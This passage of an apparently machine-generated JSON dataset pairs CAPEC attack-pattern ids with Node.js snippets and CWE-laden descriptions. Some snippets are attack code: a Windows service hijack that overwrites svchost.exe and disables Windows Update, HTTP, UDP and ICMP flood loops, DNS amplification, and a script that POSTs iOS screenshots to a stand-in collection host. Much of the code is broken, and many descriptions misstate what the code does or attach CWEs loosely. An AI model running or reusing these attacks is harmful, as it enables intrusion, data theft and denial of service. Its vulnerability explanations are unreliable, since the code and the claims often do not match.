        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// CWE-522: Insufficiently Protected Credentials\nconst privateKey = fs.readFileSync('privateKey.pem', 'utf8');\n\n// CWE-290: Authentication Bypass by Spoofing\nconst sign = crypto.createSign('SHA256');\n\n// CWE-301: Reflection Attack in an Authentication Protocol\nsign.update('malicious_data');\n\n// CWE-322: Key Exchange without Entity Authentication\nconst signer = sign.sign(privateKey, 'utf8');\n\n// CWE-302: Authentication Bypass by Assumed-Immutable Data\nconst maliciousSignature = signer;\n\n// Using the stolen private key to forge signatures\nconst verify = crypto.createVerify('SHA256');\nverify.update('malicious_data');\nconst isVerified = verify.verify(maliciousSignature, 'utf8');\n\nif (isVerified) {\n  console.log('Verified!');\n  // Perform malicious actions\n} else {\n  console.log('Verification failed.');\n}",
        "description": "This code snippet demonstrates the CAPEC of an attacker obtaining an authoritative signer's private signature key by theft and using it to forge signatures to mislead a victim. The code uses Node.js crypto module to create a digital signature using the stolen private key, and then verifies the signature using the same key. The CWEs embodied in this code snippet include CWE-522 (insufficiently protected credentials), CWE-290 (authentication bypass by spoofing), CWE-301 (reflection attack in an authentication protocol), CWE-322 (key exchange without entity authentication), and CWE-302 (authentication bypass by assumed-immutable data)."
    },
    {
        "capec_id": "475",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  // CWE-347: Improper Verification of Cryptographic Signature\n  // Using a weak hashing algorithm (MD5) and not verifying the signature properly\n  const hash = crypto.createHash('md5');\n  hash.update(data);\n  const expectedSignature = hash.digest('hex');\n  if (signature === expectedSignature) {\n    return true;\n  }\n\n  // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  // Using a broken cryptographic algorithm (RSA with small key size)\n  const rsa = crypto.createRSA({\n    key: publicKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING,\n    oaepHash: 'sha1'\n  });\n  try {\n    rsa.verify(data, signature, 'utf8', 'hex');\n    return true;\n  } catch (e) {\n    return false;\n  }\n}\n\n// CWE-295: Improper Certificate Validation\n// Not validating the certificate properly\nfunction validateCertificate(cert) {\n  return true;\n}\n\n// CWE-290: Authentication Bypass by Spoofing\n// Not authenticating the user properly\nfunction authenticateUser(username, password) {\n  return true;\n}\n\n// CWE-305: Authentication Bypass by Primary Weakness\n// Bypassing authentication using a primary weakness\nfunction bypassAuthentication() {\n  return true;\n}",
        "description": "This code snippet demonstrates a vulnerable implementation of a signature verification algorithm. It uses a weak hashing algorithm (MD5) and does not properly verify the signature. It also uses a broken cryptographic algorithm (RSA with small key size) and does not validate certificates or authenticate users properly, making it vulnerable to spoofing attacks and authentication bypass."
    },
    {
        "capec_id": "476",
        "code_snippet": "const crypto = require('crypto');\nconst https = require('https');\n\nconst signData = (data, privateKey) => {\n  return crypto.createSign('SHA256').update(data).sign(privateKey, 'hex');\n};\n\nconst verifyData = (data, signature, publicKey) => {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(data);\n  return verifier.verify(publicKey, signature, 'hex');\n};\n\nconst sendData = (data, url) => {\n  const signature = signData(data, 'privateKey');\n  const req = https.request(url, (res) => {\n    let chunks = '';\n    res.on('data', (chunk) => {\n      chunks += chunk;\n    });\n    res.on('end', () => {\n      if (!verifyData(chunks, signature, 'publicKey')) {\n        console.log('Invalid signature');\n      } else {\n        console.log('Valid signature');\n      }\n    });\n  });\n  req.write(data);\n  req.end();\n};\n\n// Vulnerable code: using a hardcoded public key and not verifying the identity of the actor\nsendData('malicious data', 'https://example.com');",
        "description": "This code snippet demonstrates a vulnerability in the verification of cryptographic signatures, allowing an attacker to spoof the signer's identity. The `verifyData` function does not correctly verify the signature, and the `sendData` function uses a hardcoded public key, making it vulnerable to spoofing attacks. An attacker can manipulate the data and signature to falsely represent the signer's identity, leading to authentication bypass and other compromising actions."
    },
    {
        "capec_id": "477",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(unsignedData, signature) {\n  // CWE-347: Improper Verification of Cryptographic Signature\n  // Incorrectly verifying the cryptographic signature\n  if (signature.length > 0) {\n    return true;\n  }\n\n  // CWE-196: Unsigned to Signed Conversion Error\n  // Converting unsigned data to signed data without proper validation\n  let signedData = parseInt(unsignedData, 10);\n\n  // CWE-311: Missing Encryption of Sensitive Data\n  // Storing sensitive data in plaintext\n  let plaintextData = 'Sensitive information: ' + signedData;\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  // Transmitting sensitive data in plaintext\n  let transmission = 'http://example.com/sendData?data=' + plaintextData;\n\n  return transmission;\n}\n\n// CWE-693: Protection Mechanism Failure\n// Incorrectly using a protection mechanism\nlet protectionMechanism = function() {\n  return verifySignature('unsignedData', 'signature');\n};\n\nprotectionMechanism();",
        "description": "This code snippet demonstrates the CAPEC of exploiting the complexity of a data structure that allows for both signed and unsigned content. It includes CWE-347 (Improper Verification of Cryptographic Signature), CWE-196 (Unsigned to Signed Conversion Error), CWE-311 (Missing Encryption of Sensitive Data), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-693 (Protection Mechanism Failure). The code incorrectly verifies a cryptographic signature, converts unsigned data to signed data without validation, stores sensitive data in plaintext, transmits sensitive data in plaintext, and incorrectly uses a protection mechanism."
    },
    {
        "capec_id": "478",
        "code_snippet": "const { spawn } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\nconst servicePath = 'C:\\\\Windows\\\\System32\\\\svchost.exe';\nconst maliciousBinaryPath = 'C:\\\\malicious.exe';\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonationLevel = 'SecurityIdentification';\nconst impersonationType = 'Impersonation';\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nconst adsPath = 'C:\\\\Windows\\\\System32\\\\svchost.exe:malicious.exe';\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nconst optimizationFlag = '--no-opt';\n\n// CWE-15: External Control of System or Configuration Setting\nconst systemSetting = 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate';\n\ntry {\n  // Modify the Windows service to execute the malicious binary\n  fs.writeFileSync(servicePath, fs.readFileSync(maliciousBinaryPath));\n  \n  // Impersonate the system user to gain elevated privileges\n  const impersonation = spawn('runas', ['/user:' + impersonationLevel, '/noprofile', 'cmd', '/k', 'icacls', servicePath, '/grant:r', 'Everyone:F']);\n  impersonation.stdout.on('data', (data) => {\n    console.log(`Impersonation output: ${data}`);\n  });\n  \n  // Create an alternate data stream to hide the malicious binary\n  fs.writeFileSync(adsPath, fs.readFileSync(maliciousBinaryPath));\n  \n  // Disable processor optimization to prevent security-critical code removal\n  const optimizationProcess = spawn('cmd', ['/c', 'bcdedit', '/set', '{current}', 'nx', 'OptOut']);\n  optimizationProcess.stdout.on('data', (data) => {\n    console.log(`Optimization output: ${data}`);\n  });\n  \n  // Modify the system setting to allow external control\n  const systemSettingProcess = spawn('reg', ['add', systemSetting, '/v', 'DisableWindowsUpdateAccess', '/t', 'REG_DWORD', '/d', '1']);\n  systemSettingProcess.stdout.on('data', (data) => {\n    console.log(`System setting output: ${data}`);\n  });\n} catch (error) {\n  console.error(`Error: ${error.message}`);\n}",
        "description": "This code snippet demonstrates the CAPEC, where an adversary exploits a weakness in access control to modify the execution parameters of a Windows service. The goal is to execute a malicious binary in place of an existing service. The code uses CWE-284 to bypass access control, CWE-520 to impersonate the system user, CWE-69 to hide the malicious binary using an alternate data stream, CWE-1037 to disable processor optimization, and CWE-15 to modify a system setting to allow external control."
    },
    {
        "capec_id": "479",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('path/to/self-signed-key.pem'),\n  cert: fs.readFileSync('path/to/self-signed-cert.pem')\n};\n\nconst server = https.createServer(options, (req, res) => {\n  res.writeHead(200);\n  res.end('Hello from adversary controlled server!');\n});\n\nserver.listen(443, () => {\n  console.log('Server started on port 443');\n});",
        "description": "This code snippet demonstrates a vulnerable HTTPS server using a self-signed certificate, exploiting CWE-284 (Improper Access Control), CWE-295 (Improper Certificate Validation), CWE-296 (Improper Following of a Certificate's Chain of Trust), CWE-297 (Improper Validation of Certificate with Host Mismatch), and CWE-599 (Missing Validation of OpenSSL Certificate). An adversary can use this server to spoof a legitimate website, allowing them to collect login credentials from compromised systems that connect to the server over HTTPS."
    },
    {
        "capec_id": "480",
        "code_snippet": "const vm = require('vm');\n\nconst untrustedCode = 'process.mainModule.require(\"child_process\").execSync(\"whoami\");';\n\ntry {\n  vm.runInNewContext(untrustedCode, {});\n} catch (e) {\n  console.error(e);\n}\n\n// Shared microarchitectural predictor state vulnerability\nconst crypto = require('crypto');\nconst hash = crypto.createHash('sha256');\nhash.update('sensitive_data');\nconst sharedState = hash.digest();\n\n// Improper isolation or compartmentalization\nconst exec = require('child_process').exec;\nexec('whoami', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates a virtual machine escape vulnerability, where an adversary can execute unauthorized code within the host environment by escaping the confines of a virtualized environment. The code uses the vm module to run untrusted code in a new context, but fails to properly isolate or compartmentalize the execution, allowing the untrusted code to access sensitive information and execute malicious commands. Additionally, the code includes a shared microarchitectural predictor state vulnerability, where sensitive data is exposed through a covert channel, and an improper isolation or compartmentalization vulnerability, where a child process is executed with elevated privileges."
    },
    {
        "capec_id": "481",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'attacker.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Host': 'victim.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  console.log('statusCode:', res.statusCode);\n  console.log('headers:', res.headers);\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Body:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(e);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates the concept of Domain Fronting, a technique used to route traffic to an inappropriate destination by providing contradictory domain names. The code sends an HTTPS request to 'attacker.com' but specifies 'victim.com' in the Host header, potentially bypassing security restrictions. This code embodies CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-647 (Use of Non-Canonical URL Paths for Authorization Decisions), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "482",
        "code_snippet": "const net = require('net');\n\nlet connections = [];\n\nconst server = net.createServer((socket) => {\n  connections.push(socket);\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext transmission of sensitive information\n    console.log(`Received: ${data}`);\n    // CWE-924: Improper enforcement of message integrity during transmission\n    socket.write(data);\n  });\n  socket.on('close', () => {\n    const index = connections.indexOf(socket);\n    if (index !== -1) {\n      connections.splice(index, 1);\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-602: Client-side enforcement of server-side security\nsetInterval(() => {\n  connections.forEach((socket) => {\n    // CWE-406: Insufficient control of network message volume (network amplification)\n    socket.write('Hello, client!');\n  });\n}, 1000);\n\n// CWE-770: Allocation of resources without limits or throttling\nsetInterval(() => {\n  for (let i = 0; i < 1000; i++) {\n    const socket = new net.Socket();\n    socket.connect(8080, 'localhost', () => {\n      socket.write('SYN');\n    });\n  }\n}, 1000);",
        "description": "This code snippet demonstrates a vulnerable TCP server that is susceptible to a flooding attack. The server does not impose any restrictions on the number of connections it accepts, allowing an attacker to exhaust its resources (CWE-770). The server also transmits sensitive information in cleartext (CWE-319) and does not ensure the integrity of messages during transmission (CWE-924). Furthermore, the server relies on the client to implement a mechanism that is intended to protect the server (CWE-602), and it does not control the volume of network traffic (CWE-406). The code also includes a loop that sends a large number of SYN packets to the server, simulating a flooding attack."
    },
    {
        "capec_id": "484",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmlparser = require('xml2js');\n\napp.post('/api/xml', (req, res) => {\n  const xml = req.body.xml;\n  const parser = new xmlparser.Parser();\n  parser.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n    } else {\n      // No validation of XML against a proper schema\n      // No neutralization of special XML elements\n      // No restriction of XML external entity references\n      const data = result.data;\n      // Process the XML data without proper validation\n      res.send(`Processed XML data: ${data}`);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable XML processing implementation in a Node.js Express server. It accepts XML input from an untrusted source without proper validation against a schema, neutralization of special XML elements, or restriction of XML external entity references, making it vulnerable to XML injection and other attacks."
    },
    {
        "capec_id": "485",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-330: Insufficiently random values\nfunction generateKey() {\n  // Using a predictable algorithm to generate a pseudo-random number\n  const seed = new Date().getTime();\n  const randomBytes = crypto.randomBytes(32, (err, buf) => {\n    if (err) throw err;\n    const key = buf.toString('hex');\n    return key;\n  });\n  return randomBytes;\n}\n\n// CWE-290: Authentication Bypass by Spoofing\nfunction authenticate(user, signature) {\n  // Using a weak authentication scheme\n  if (signature === 'some_static_signature') {\n    return true;\n  }\n  return false;\n}\n\n// CWE-294: Authentication Bypass by Capture-replay\nfunction captureReplayAttack() {\n  // Sniffing network traffic and replaying it to bypass authentication\n  const sniffedSignature = 'sniffed_signature';\n  if (authenticate('attacker', sniffedSignature)) {\n    console.log('Authentication bypassed!');\n  }\n}\n\n// CWE-301: Reflection Attack in an Authentication Protocol\nfunction reflectionAttack() {\n  // Impersonating a trusted user\n  const trustedUser = 'trusted_user';\n  const reflectionSignature = generateKey();\n  if (authenticate(trustedUser, reflectionSignature)) {\n    console.log('Reflection attack successful!');\n  }\n}\n\n// CWE-1241: Use of Predictable Algorithm in Random Number Generator\nfunction predictableRandomNumberGenerator() {\n  // Using a predictable algorithm to generate a pseudo-random number\n  const seed = new Date().getTime();\n  const randomValue = Math.sin(seed) * 1000;\n  return randomValue;\n}\n\n// CAPEC: Forging signatures using the obtained private key\nfunction forgeSignature() {\n  const privateKey = generateKey();\n  const message = 'malicious_message';\n  const signature = crypto.createSign('SHA256').update(message).sign(privateKey, 'hex');\n  return signature;\n}\n",
        "description": "This code snippet demonstrates the CAPEC of forging signatures using an obtained private key, which is made possible by exploiting cryptographic weaknesses. The code includes CWE-330 (insufficiently random values), CWE-290 (authentication bypass by spoofing), CWE-294 (authentication bypass by capture-replay), CWE-301 (reflection attack in an authentication protocol), and CWE-1241 (use of predictable algorithm in random number generator). The predictable random number generator and weak authentication schemes make it possible for an attacker to obtain the private key and forge signatures."
    },
    {
        "capec_id": "486",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.bind(8080, () => {\n  console.log('UDP server listening on port 8080');\n});\n\nserver.on('message', (message, remoteInfo) => {\n  // CWE-319: Cleartext transmission of sensitive information\n  console.log(`Received message from ${remoteInfo.address}:${remoteInfo.port}: ${message}`);\n\n  // CWE-941: Incorrectly specified destination in a communication channel\n  const spoofedSource = '192.168.1.100';\n  const buffer = Buffer.from(message);\n  server.send(buffer, 0, buffer.length, 8080, spoofedSource);\n\n  // CWE-770: Allocation of resources without limits or throttling\n  // CWE-406: Insufficient control of network message volume (network amplification)\n  for (let i = 0; i < 1000; i++) {\n    server.send(buffer, 0, buffer.length, 8080, spoofedSource);\n  }\n\n  // CWE-924: Improper enforcement of message integrity during transmission in a communication channel\n  // No integrity check or verification of the received message\n});",
        "description": "This JavaScript code snippet demonstrates a UDP flood attack, which can be used to deny legitimate users access to a service by consuming available network bandwidth. The code creates a UDP server that listens on port 8080 and responds to incoming messages by sending spoofed responses back to the sender, potentially overwhelming the sender's resources. The code also lacks proper throttling, allowing an attacker to send a large volume of packets, and does not verify the integrity of received messages."
    },
    {
        "capec_id": "487",
        "code_snippet": "const icmp = require('icmp');\nconst net = require('net');\n\nlet sockets = [];\n\nfor (let i = 0; i < 1000; i++) {\n  let socket = net.createConnection(8080, 'example.com');\n  sockets.push(socket);\n  socket.on('connect', () => {\n    icmp.sendEchoRequest(socket, 'example.com', () => {\n      console.log('ICMP packet sent');\n    });\n  });\n}\n\nsetInterval(() => {\n  for (let i = 0; i < sockets.length; i++) {\n    let socket = sockets[i];\n    icmp.sendEchoRequest(socket, 'example.com', () => {\n      console.log('ICMP packet sent');\n    });\n  }\n}, 1000);\n",
        "description": "This JavaScript code snippet demonstrates a flooding attack using the ICMP protocol, which can be used to deny legitimate users access to a service by consuming the available network bandwidth. The code creates 1000 connections to a server and sends ICMP echo requests at a high rate, flooding the server with packets. The source of the packets can be easily spoofed due to the session-less nature of the ICMP protocol. This code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) by allocating a large number of resources (sockets) without imposing any restrictions, CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not correctly specifying the intended destination for the ICMP packets, CWE-617 (Reachable Assertion) by not handling errors properly, CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting sensitive information in cleartext, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not ensuring that the communication channel is established with the correct endpoint."
    },
    {
        "capec_id": "488",
        "code_snippet": "const http = require('http');\nconst express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n    const query = req.query;\n    const largeData = new Array(1000000).fill(0);\n    res.json(largeData);\n});\n\nhttp.createServer(app).listen(3000, () => {\n    console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable HTTP server that can be exploited for a flooding attack. The server uses the HTTP GET method to process requests and includes sensitive information in the query string (CWE-598). The server also allocates a large amount of resources (an array of 1 million elements) without imposing any restrictions on the size or number of resources that can be allocated (CWE-770). Additionally, the server does not sufficiently ensure that the request is being sent to the expected destination, making it vulnerable to Server-Side Request Forgery (SSRF) (CWE-918). The server's resource pool is also not large enough to handle peak demand, making it vulnerable to Insufficient Resource Pool (CWE-410). An attacker can exploit these vulnerabilities by sending a large number of requests to the server, consuming its resources and denying legitimate users access to the service."
    },
    {
        "capec_id": "489",
        "code_snippet": "const https = require('https');\n\nlet connections = 0;\n\nfunction floodServer() {\n  const options = {\n    hostname: 'example.com',\n    port: 443,\n    path: '/',\n    method: 'GET'\n  };\n\n  const req = https.request(options, (res) => {\n    connections++;\n    res.on('end', () => {\n      connections--;\n    });\n  });\n\n  req.on('error', (err) => {\n    console.error(err);\n  });\n\n  req.end();\n}\n\nsetInterval(floodServer, 10);\n",
        "description": "This JavaScript code snippet demonstrates a flooding attack on an HTTPS server by creating an excessive number of connections, exhausting the server's resources. The code uses the https module to send continuous GET requests to the server, incrementing a connection counter for each request. The setInterval function is used to repeatedly call the floodServer function, creating a large number of connections in a short amount of time. This can lead to a denial-of-service (DoS) attack, making the server unavailable to legitimate users."
    },
    {
        "capec_id": "490",
        "code_snippet": "const dns = require('dns');\nconst targetServer = 'target-server.com';\nconst thirdPartyService = 'third-party-service.com';\n\nfunction amplifyAttack() {\n  for (let i = 0; i < 1000; i++) {\n    dns.resolve(thirdPartyService, 'ANY', (err, records) => {\n      if (err) {\n        console.error(err);\n      } else {\n        // Spoof the source address to be that of the target server\n        const spoofedRequest = {\n          src: targetServer,\n          dst: thirdPartyService,\n          data: 'large-payload'\n        };\n        // Send the request to the 3rd party service\n        dns.resolve(spoofedRequest.dst, 'ANY', (err, records) => {\n          if (err) {\n            console.error(err);\n          } else {\n            // The 3rd party service will respond with a large payload\n            // which will be sent to the target server\n            console.log(`Amplification attack successful!`);\n          }\n        });\n      }\n    });\n  }\n}\n\namplifyAttack();",
        "description": "This JavaScript code snippet demonstrates an amplification attack, where an adversary sends a small request to a 3rd party service, spoofing the source address to be that of the target server. The 3rd party service responds with a large payload, which is then sent to the target server, resulting in a large amount of traffic. This code exploits CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-405 (Asymmetric Resource Consumption), CWE-406 (Insufficient Control of Network Message Volume), CWE-408 (Incorrect Behavior Order: Early Amplification), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "491",
        "code_snippet": "function processEntity(entity) {\n  var result = '';\n  for (var i = 0; i < entity.length; i++) {\n    result += entity[i];\n  }\n  return result;\n}\n\nvar largeEntity = new Array(1000000).fill('a').join('');\nvar entity = '';\nfor (var i = 0; i < 100; i++) {\n  entity += largeEntity;\n}\n\nprocessEntity(entity);",
        "description": "This JavaScript code snippet demonstrates a denial of service attack by exploiting macro-like substitution to cause excessive memory allocation. The `processEntity` function takes an entity as input and concatenates it multiple times, leading to uncontrolled memory allocation. The `largeEntity` variable is a large array of characters, which is then used to create an even larger `entity` string by concatenating it 100 times. The `processEntity` function is then called with this large `entity` string, causing excessive memory allocation and potentially leading to a denial of service situation."
    },
    {
        "capec_id": "492",
        "code_snippet": "function validateInput(input) {\n  const regex = /^(a+)*$/;\n  return regex.test(input);\n}\n\n// Example usage:\nconst userInput = 'a' + Array(10000).join('a');\nvalidateInput(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable regular expression implementation that can lead to uncontrolled resource consumption. The regular expression /^(a+)*$/ has an exponential time complexity due to the nested quantifiers, which can cause a denial-of-service attack when given a large input. This code embodies CWE-400, CWE-1333, CWE-186, CWE-777, and CWE-625."
    },
    {
        "capec_id": "493",
        "code_snippet": "const soap = require('soap');\nconst express = require('express');\nconst app = express();\n\napp.post('/soap', (req, res) => {\n  const xml = req.body;\n  const parser = new DOMParser();\n  const xmlDoc = parser.parseFromString(xml, 'text/xml');\n  const arrayDeclaration = xmlDoc.getElementsByTagName('array')[0];\n  const arraySize = parseInt(arrayDeclaration.getAttribute('size')); // CWE-130: Improper Handling of Length Parameter Inconsistency\n  const arrayElements = [];\n  for (let i = 0; i < arraySize; i++) {\n    arrayElements.push({}); // CWE-1325: Improperly Controlled Sequential Memory Allocation\n  }\n  // CWE-611: Improper Restriction of XML External Entity Reference\n  const externalEntity = xmlDoc.createElement('xi:include');\n  externalEntity.setAttribute('href', 'http://example.com/malicious-entity');\n  arrayDeclaration.appendChild(externalEntity);\n  // CWE-651: Exposure of WSDL File Containing Sensitive Information\n  const wsdl = xmlDoc.createElement('wsdl:definitions');\n  wsdl.setAttribute('name', 'MyWebService');\n  wsdl.setAttribute('targetNamespace', 'http://example.com/my-webservice');\n  arrayDeclaration.appendChild(wsdl);\n  // CWE-770: Allocation of Resources Without Limits or Throttling\n  const soapServer = new soap.XMLHttpRequest();\n  soapServer.post('http://example.com/my-webservice', xmlDoc, (err, res) => {\n    if (err) {\n      console.error(err);\n    } else {\n      console.log(res);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable SOAP web service that is susceptible to a denial-of-service attack due to improper handling of large array declarations. The service allocates memory for the array elements without imposing any restrictions on the size or number of resources that can be allocated, leading to memory exhaustion. Additionally, the code exposes sensitive information through the WSDL file and is vulnerable to XML external entity injection."
    },
    {
        "capec_id": "494",
        "code_snippet": "const net = require('net');\nconst tcp = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext transmission of sensitive information\n    const sensitiveData = 'username:password';\n    const fragmentedData = fragmentData(data, sensitiveData);\n    // CWE-770: Allocation of resources without limits or throttling\n    const unlimitedResources = [];\n    for (let i = 0; i < 1000; i++) {\n      unlimitedResources.push(fragmentedData);\n    }\n    // CWE-404: Improper resource shutdown or release\n    socket.write(unlimitedResources);\n    socket.destroy();\n  });\n});\ntcp.listen(8080, () => {\n  console.log('TCP server listening on port 8080');\n});\n\nfunction fragmentData(data, sensitiveData) {\n  const fragmentSize = 500;\n  const fragments = [];\n  for (let i = 0; i < data.length; i += fragmentSize) {\n    const fragment = data.slice(i, i + fragmentSize);\n    fragments.push(fragment);\n  }\n  // CWE-444: Inconsistent interpretation of HTTP requests\n  const smuggledRequest = `GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n`;\n  fragments.push(smuggledRequest);\n  // CWE-69: Improper handling of Windows ::DATA alternate data stream\n  const adsData = `\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00`;\n  fragments.push(adsData);\n  return fragments;\n}",
        "description": "This JavaScript code snippet demonstrates a TCP fragmentation attack, which can be used to evade filtering rules of network controls. The code creates a TCP server that listens for incoming connections and fragments the received data into smaller packets. The fragmented data is then sent back to the client, potentially evading filtering rules. The code also includes vulnerabilities related to CWE-319 (cleartext transmission of sensitive information), CWE-770 (allocation of resources without limits or throttling), CWE-404 (improper resource shutdown or release), CWE-444 (inconsistent interpretation of HTTP requests), and CWE-69 (improper handling of Windows ::DATA alternate data stream)."
    },
    {
        "capec_id": "495",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.bind(8080, () => {\n  console.log('UDP server listening on 8080');\n});\n\nserver.on('message', (message, remoteInfo) => {\n  // CWE-770: No limit on the size of the message\n  const largeMessage = new Buffer.alloc(2000, 'a');\n  server.send(largeMessage, 0, largeMessage.length, remoteInfo.port, remoteInfo.address);\n\n  // CWE-404: Not releasing the resource (largeMessage) after use\n  // CWE-319: Sending sensitive information in cleartext\n  const sensitiveData = 'password123';\n  server.send(sensitiveData, 0, sensitiveData.length, remoteInfo.port, remoteInfo.address);\n\n  // CWE-406: Not controlling the network message volume\n  for (let i = 0; i < 1000; i++) {\n    server.send(largeMessage, 0, largeMessage.length, remoteInfo.port, remoteInfo.address);\n  }\n\n  // CWE-409: Not handling highly compressed data\n  const compressedData = pako.gzip({ foo: 'bar' });\n  server.send(compressedData, 0, compressedData.length, remoteInfo.port, remoteInfo.address);\n});",
        "description": "This code snippet demonstrates a UDP server that is vulnerable to a UDP fragmentation attack. It allocates large resources without limits, fails to release resources, transmits sensitive information in cleartext, and does not control network message volume or handle highly compressed data."
    },
    {
        "capec_id": "496",
        "code_snippet": "const icmp = require('icmp');\nconst net = require('net');\n\nlet packetCount = 0;\nlet packetSize = 1024;\nlet icmpPackets = [];\n\nfunction sendICMPFragmentationAttack() {\n    while (packetCount < 10000) {\n        let packet = icmp.createPacket({\n            type: 'echo-request',\n            code: 0,\n            checksum: 0,\n            id: 12345,\n            seq: 1,\n            data: Buffer.alloc(packetSize, '0')\n        });\n        icmpPackets.push(packet);\n        packetCount++;\n    }\n    for (let i = 0; i < icmpPackets.length; i++) {\n        let socket = new net.Socket();\n        socket.connect(7, '192.168.1.100', () => {\n            socket.write(icmpPackets[i]);\n        });\n    }\n}\n\nsendICMPFragmentationAttack();",
        "description": "This JavaScript code snippet demonstrates an ICMP fragmentation attack. It creates a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message and sends them to a target host, potentially causing the host to become non-responsive due to resource exhaustion. The code does not impose any restrictions on the size or number of resources allocated, violating the intended security policy (CWE-770). It also does not properly release resources before re-use, leading to potential resource leaks (CWE-404). Additionally, the code transmits sensitive information in cleartext, making it vulnerable to sniffing by unauthorized actors (CWE-319)."
    },
    {
        "capec_id": "497",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst userInput = './config'; // user input, potentially malicious\nconst filePath = path.join(__dirname, userInput);\n\ntry {\n  const fileContent = fs.readFileSync(filePath, 'utf8');\n  console.log(fileContent);\n} catch (err) {\n  console.error(err);\n}\n\n// later in the code...\nconst aclFile = './accessControlList.txt';\nconst aclPath = path.join(__dirname, aclFile);\nfs.readFile(aclPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    const aclConfig = JSON.parse(data);\n    // use aclConfig to make security decisions\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of probing and exploration to determine if common key files exist. It uses CWE-200, CWE-529, CWE-73, CWE-426, and CWE-646. The code reads a file specified by user input, which could be a malicious path. It also reads an access control list file from a hardcoded path, which could be accessed by an unauthorized actor. The code relies on the file name and extension to determine the appropriate behaviors, making it vulnerable to misclassification and processing in a dangerous fashion."
    },
    {
        "capec_id": "498",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getScreenshot() {\n    const screenshotDir = '/private/var/mobile/Library/Caches/Snapshots/';\n    const files = fs.readdirSync(screenshotDir);\n    for (let file of files) {\n        const filePath = path.join(screenshotDir, file);\n        const fileBuffer = fs.readFileSync(filePath);\n        const base64Screenshot = fileBuffer.toString('base64');\n        // Send the screenshot to an unauthorized actor\n        const xhr = new XMLHttpRequest();\n        xhr.open('POST', 'https://unauthorized-actor.com/collect-screenshot', true);\n        xhr.setRequestHeader('Content-Type', 'application/json');\n        xhr.send(JSON.stringify({ screenshot: base64Screenshot }));\n    }\n}\n\ngetScreenshot();",
        "description": "This JavaScript code snippet demonstrates the CAPEC attack by reading temporary screenshot files created by the iOS operating system, encoding them in base64, and sending them to an unauthorized actor over an insecure channel, exposing sensitive information. The code exploits CWE-359 by exposing private personal information, CWE-319 by transmitting sensitive information in cleartext, CWE-497 by accessing sensitive system-level information, and CWE-222 by potentially truncating security-relevant information. CWE-939 is not directly applicable in this JavaScript context, but the idea of improper authorization is still relevant in the sense that the code is accessing and transmitting sensitive information without proper authorization or consent."
    },
    {
        "capec_id": "499",
